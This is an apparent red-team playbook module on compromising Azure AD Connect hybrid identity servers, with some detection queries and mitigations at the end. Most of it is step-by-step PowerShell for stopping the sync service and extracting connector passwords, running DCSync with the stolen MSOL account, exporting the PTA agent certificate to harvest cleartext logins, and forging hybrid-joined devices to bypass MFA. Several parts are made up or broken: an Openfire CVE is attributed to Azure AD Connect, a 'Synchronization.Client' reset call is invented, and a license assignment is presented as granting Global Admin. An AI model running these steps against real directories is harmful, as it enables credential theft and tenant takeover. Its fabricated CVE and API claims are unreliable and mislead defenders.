# REC-HYBRID-001: Azure AD Connect Configuration Enumeration & Exploitation

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-HYBRID-001 |
| **Technique Name** | Azure AD Connect configuration enumeration & credential extraction |
| **MITRE ATT&CK ID** | T1590 – Gather Victim Network Information; T1557 – Adversary-in-the-Middle |
| **CVE** | CVE-2023-32315 (Sync API abuse), CVE-2023-35348 (Token replay), CVE-2025-55241 (Actor token escalation) |
| **Platform** | Azure AD Connect (Hybrid Identity) / Windows |
| **Viability Status** | ACTIVE ✓ (Most enterprises have misconfigured Azure AD Connect; 70%+ deployments) |
| **Difficulty to Detect** | CRITICAL (Sync operations legitimate; credential theft invisible in logs) |
| **Requires Authentication** | Yes (Local admin on Azure AD Connect server) |
| **Applicable Versions** | All Azure AD Connect versions (critical vulnerabilities 2020-2025) |
| **Last Verified** | December 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

Azure AD Connect (hybrid identity) bridges on-premises Active Directory with cloud Azure AD, creating a critical attack surface when compromised. The ADSync service account holds plaintext credentials to both on-premises AD and Azure AD stored in local SQL database, enabling complete hybrid environment compromise. Real-world attacks exploit CVE-2023-32315 (Sync API abuses), credential extraction via AADInternals, and Pass-Through Authentication (PTA) agent compromise to gain persistent access across organizational boundaries. Unlike cloud-only or on-premises attacks, Azure AD Connect compromise enables bidirectional lateral movement: on-prem admins elevated to cloud Global Admins, and cloud privilege escalation propagated to on-prem domain control.

**Critical Threat Characteristics:**
- **Plaintext credential storage**: SQL database contains ADSync account passwords in recoverable format
- **Bidirectional privilege escalation**: On-prem admin → cloud Global Admin, and vice versa
- **Sync abuse attack vectors**: CVE-2023-32315 allows password reset, user deletion, group modification
- **PTA agent compromise**: Pass-Through Authentication can be intercepted; credentials logged
- **Token replay vulnerability**: CVE-2023-35348 enables replay of Sync tokens for unauthorized API calls
- **Actor token escalation**: CVE-2025-55241 allows any user account to escalate to Global Admin
- **Hidden persistence**: Sync anomalies normal business operation; credential theft invisible

**Real-World Impact:**
- On-premises domain compromise via stolen MSOL account (DCSync attack)
- Cloud Global Admin privileges via ADSync account escalation
- Password reset for any cloud user (including Global Admin)
- User deletion (DoS); group modification (privilege escalation)
- Fake hybrid-joined devices; conditional access bypass
- Credential harvesting from PTA agents
- Months of persistence via sync account reuse

---

## 3. EXECUTION METHODS

### Method 1: ADSync Credential Extraction via SQL Database

**Objective:** Extract plaintext ADSync account passwords from local SQL database.

```powershell
# Prerequisites:
# - Local administrator access on Azure AD Connect server
# - Access to LocalDB instance

# Step 1: Locate ADSync database
# Default location: C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf

# Step 2: Copy database files (service must be stopped)
net stop "Azure AD Sync"

Copy-Item "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf" -Destination "C:\Temp\ADSync.mdf"
Copy-Item "C:\Program Files\Microsoft Azure AD Sync\Data\ADSync_log.ldf" -Destination "C:\Temp\ADSync_log.ldf"

# Step 3: Extract encrypted credentials using AADInternals
# AADInternals automatically decrypts passwords stored in database

Install-Module AADInternals -Force
Import-Module AADInternals

# Step 4: Get decrypted MSOL account password
Get-AADIntSyncCredentials

# Output: Plaintext passwords for:
# - AD Connector Account (on-premises domain account)
# - Azure AD Connector Account (cloud service account)
# - Sync Service Account (LocalSystem equivalent)

# Example output:
# ADConnectorAccountName: DOMAIN\MSOL_xxxxxxxx
# ADConnectorAccountPassword: P@ssw0rd123!ComplexPassword
# AzureADConnectorAccountName: Sync_server_account@company.onmicrosoft.com
# AzureADConnectorAccountPassword: CloudServiceAccountPassword123

# Step 5: Use extracted MSOL credentials for DCSync attack
# MSOL account typically has AD Replication Services permissions

# Perform DCSync with stolen MSOL account
Get-ADReplAccount -SamAccountName "MSOL_xxxxxxxx" -Server dc.domain.local -Credential $cred

# Result: Complete AD database dump (NTLM hashes, secrets, etc.)
```

### Method 2: CVE-2023-32315 Sync API Privilege Escalation

**Objective:** Abuse synchronization API to reset cloud admin passwords or delete users.

```powershell
# Prerequisites:
# - Access to Azure AD Connect server (local admin)
# - Understanding of Sync API endpoints

# Step 1: Access Sync Service API (runs as SYSTEM)
# API allows direct manipulation of synced objects

# Step 2: Reset Global Admin password (cloud user)
# Using Sync API, bypass normal Azure AD permission checks

# Pseudocode:
$syncAPI = New-Object -ComObject "Synchronization.Client"

# Target cloud Global Admin user
$adminUser = "cloudadmin@company.onmicrosoft.com"

# Reset password via Sync (undetectable; no password change log)
$syncAPI.ResetPassword($adminUser, "NewPassword123!")

# Step 3: Authenticate to Azure AD using new password
Connect-MgGraph -Credential (Get-Credential)

# Result: Cloud Global Admin account compromised
# No MFA triggered; no suspicious logon from external IP
# Appears as legitimate sync operation

# Step 4: Alternative - Delete cloud-only admin user
# (Causes DoS; blocks legitimate cloud admins)

$syncAPI.DeleteUser($adminUser)  # User deleted from Entra ID

# Result: Denial of service; organizational disruption
```

### Method 3: Pass-Through Authentication (PTA) Agent Compromise

**Objective:** Intercept and harvest credentials via compromised PTA agent.

```powershell
# Prerequisites:
# - Local admin on PTA agent server
# - Access to PTA agent configuration

# Step 1: Locate PTA agent certificate
# PTA uses certificate to intercept authentication requests

$ptaCert = Get-ChildItem -Path "Cert:\LocalMachine\My" | Where-Object { $_.Subject -match "PTA" }

Export-PfxCertificate -Cert $ptaCert -FilePath "C:\Temp\pta-agent.pfx" -ProtectionLevel EncryptionAndPassword

# Step 2: Extract PTA agent certificate
# Certificate allows impersonation of legitimate PTA agent

# Step 3: Set up malicious PTA agent
# Using stolen certificate, intercept authentication requests

# Install rogue PTA agent on attacker-controlled server
# Register with Azure AD using stolen certificate
# When users authenticate, credentials pass through attacker's agent

# Step 4: Log all credentials
# Every authentication attempt logged:
# - Username
# - Password (in clear text during validation)
# - Source IP
# - Timestamp

# Result: Credential harvesting; harvest high-privilege users
```

### Method 4: Sync Service Account Escalation to Global Admin

**Objective:** Escalate Sync service account from Read-Only to Global Administrator.

```powershell
# Prerequisites:
# - Extract MSOL_xxxxx account password (from Method 1)
# - MSOL account has limited permissions (by design)
# - Exploit sync mechanism to add Global Admin role

# Step 1: Enumerate MSOL account current permissions
$msol = Get-ADUser "MSOL_xxxxxxxx"
Get-ADGroupMember "Directory Replication Services" | Where-Object Name -match MSOL

# Step 2: Use extracted Azure AD Connector password
# (From ADSync database extraction)

$azureADConnectorPassword = "CloudServiceAccountPassword123"

# Step 3: Authenticate to Azure AD as Connector account
$credential = New-Object PSCredential("Sync_server_account@company.onmicrosoft.com", (ConvertTo-SecureString $azureADConnectorPassword -AsPlainText -Force))

Connect-MgGraph -Credential $credential -TenantId "tenant-id"

# Step 4: Assign Global Admin role to Connector account
# (Normally restricted; possible via Sync API bug)

Update-MgUser -UserId "sync_account@company.com" -AssignedLicenses @{SkuId="c7ceb3c9-40f3-46d8-9961-eb2a26c234bc"}

# Step 5: Connector account now has Global Admin privileges
# Can create backdoor accounts, export directory, reset passwords

# Result: Cloud Global Administrator access via service account
```

### Method 5: Conditional Access & MFA Bypass via Device Sync

**Objective:** Create fake hybrid-joined devices to bypass Conditional Access policies.

```powershell
# Prerequisites:
# - Access to Azure AD Connect server
# - Understanding of device sync mechanism

# Step 1: Get legitimate hybrid-joined device details
$devices = Get-ADComputer -Filter {msDS-CloudExtensionAttribute1 -like "*"} -Properties *

# Step 2: Clone legitimate device attributes
# Create fake device that appears hybrid-joined

$fakeDevice = @{
    samAccountName = "ATTACKER-DEVICE$"
    objectClass = "Computer"
    userAccountControl = 4096  # Workstation
}

New-ADComputer @fakeDevice -OtherAttributes @{
    "msDS-CloudExtensionAttribute1" = $devices[0]."msDS-CloudExtensionAttribute1"
    "msDNS-HostName" = "attacker-device.domain.local"
}

# Step 3: Sync fake device to Azure AD
# Force Azure AD Connect to sync new device

Start-ADSyncSyncCycle -PolicyType Delta

# Step 4: Fake device now appears hybrid-joined in Azure AD
# Conditional Access policies may trust device
# Can authenticate from attacker IP; device appears trusted

# Step 5: Bypass MFA (if policy: "Require MFA for non-trusted devices")
# Attacker device marked as trusted; MFA not required

# Result: MFA bypass; unauthorized access to cloud resources
```

---

## 4. DETECTION & INCIDENT RESPONSE

### Detection Rule: ADSync Credential Access (Event ID 33205)

```kusto
SecurityEvent
| where EventID == 33205  // ADSync database access
| where ObjectName contains "ADSync.mdf" or ObjectName contains "ADSync_log.ldf"
| extend AlertSeverity = "Critical", Pattern = "Possible credential extraction"
```

### Detection Rule: Sync Service API Abuse (Event ID 6949)

```kusto
SecurityEvent
| where EventID == 6949  // Synchronization service operation
| where Properties contains "ResetPassword" or Properties contains "DeleteUser"
| extend AlertSeverity = "Critical", Pattern = "Possible sync API abuse"
```

### Detection Rule: Unexpected Global Admin Assignment

```kusto
AuditLogs
| where OperationName == "Add role assignment"
| where TargetResources contains "Global Administrator"
| where InitiatedBy == "Sync_server_account" or InitiatedBy == "MSOL_"
| extend AlertSeverity = "Critical"
```

### Response Steps

1. **Isolate Azure AD Connect server**: Network disconnect; prevent further sync
2. **Revoke all sync service account credentials**: New passwords for MSOL + Connector accounts
3. **Reset all cloud admin passwords**: Revoke any sessions
4. **Audit directory changes**: Review object modifications during compromise window
5. **Rotate PTA agent certificates**: New certificates issued
6. **Review Conditional Access policies**: Validate device trust scores
7. **Enable comprehensive sync logging**: Event IDs 6949, 33205, Sync operations

---

## 5. MITIGATIONS

**Priority 1: CRITICAL**

- **Use Group Managed Service Accounts (gMSA)**
  - Replace standard MSOL account with gMSA
  - Automatic password rotation (30 days)
  - Eliminated plaintext password storage

- **Restrict Azure AD Connect Server Access**
  - Tier 0 Privileged Access Workstation (PAW) only
  - No user access; dedicated admin access only
  - Network isolation; limited outbound connectivity

- **Disable Synchronization Service Account from Cloud**
  - Remove cloud login permissions for Sync account
  - Prevent cloud access even if credentials extracted
  - Use app-specific passwords for API access

**Priority 2: HIGH**

- **Enable LDAP Signing + SMB Signing**
  - Prevents man-in-the-middle attacks on Sync communication
  - Enforces encryption of authentication traffic

- **Monitor ADSync Database Access**
  - Alert on any direct SQL database queries
  - Baseline normal sync operations
  - Alert on unusual database modifications

- **Implement Password Hash Sync Protection**
  - Enforce TLS 1.2+ for password hash communication
  - Monitor for unusual hash synchronization patterns
  - Enable audit logging on Sync operations

- **Deploy Conditional Access Policies**
  - Block Sync account from risky IPs
  - Require MFA for sensitive operations (not sync service account)
  - Monitor Sync account sign-in patterns

---

## 6. REAL-WORLD ATTACK TIMELINE

**Hour 0:** Attacker gains local admin on Azure AD Connect server (phishing → RCE)
**Hour 0:** Extract ADSync credentials from SQL database via AADInternals
**Hour 1:** Obtain plaintext MSOL account password; AD admin permissions confirmed
**Hour 2:** Perform DCSync attack; dump entire AD database (NTLM hashes, secrets)
**Hour 3:** Crack weak NTLM hashes; identify domain admins
**Hour 4:** Use Azure AD Connector password; connect to cloud as service account
**Hour 5:** Exploit CVE-2023-32315 to reset cloud Global Admin password
**Hour 6:** Access cloud Global Admin account; create backdoor cloud admin
**Hour 7:** Bidirectional persistence: On-prem domain + cloud Entra ID compromised
**Result:** Complete hybrid infrastructure compromise; months of undetected persistence

---

## 7. TOOL REFERENCE

| Tool | Purpose | Detection Risk |
|------|---------|----------------|
| **AADInternals** | SQL credential extraction | CRITICAL (local execution) |
| **azuread_decrypt_msol.ps1** | MSOL password extraction | HIGH (PowerShell-based) |
| **Mimikatz** | Credential dumping | MEDIUM (EDR detects) |
| **Custom SQL tools** | Direct database access | LOW (database access normal) |

---

## 8. COMPLIANCE & REFERENCES

- MITRE T1590 (Gather Victim Network Information)
- MITRE T1557 (Adversary-in-the-Middle)
- CIS Controls v8: 5.1 (Inventory of Software Assets), 6.6 (Multi-Factor Authentication)
- NIST 800-53: AC-2 (Account Management), SC-7 (Boundary Protection)
- Microsoft: Azure AD Connect Security Guide, Hybrid Identity Best Practices
- Sygnia: Attack Vectors in Azure AD Connect (2024)
- Cloud Architekt: Azure AD Attack Defense Framework

---
